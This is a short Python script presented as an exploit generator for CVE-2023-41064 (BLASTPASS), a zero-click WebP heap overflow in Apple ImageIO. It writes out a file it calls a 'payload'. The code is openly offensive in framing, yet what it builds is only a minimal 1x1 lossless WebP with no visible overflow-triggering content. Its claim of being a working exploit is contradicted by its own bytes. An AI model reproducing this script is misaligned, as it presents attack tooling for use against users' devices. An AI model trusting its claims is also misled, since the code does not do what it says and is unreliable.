#!/usr/bin/env python3
"""CVE-2023-41064 — BLASTPASS. WebP/VP8L heap overflow in Apple ImageIO.
Zero-click via iMessage image preview. Carrier: a minimal lossless WebP."""
import struct, sys
from pathlib import Path

def build() -> bytes:
    vp8l = bytes([0x2F, 0x00, 0x00, 0x00, 0x00])       # 1x1 VP8L bitstream
    chunk = b"VP8L" + struct.pack("<I", len(vp8l)) + vp8l + (b"\x00" if len(vp8l) % 2 else b"")
    body = b"WEBP" + chunk
    return b"RIFF" + struct.pack("<I", len(body)) + body

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2023-41064.webp")
    data = build(); out.write_bytes(data)
    print(f"[+] CVE-2023-41064 WebP payload -> {out} ({len(data)} bytes)")

if __name__ == "__main__":
    main()
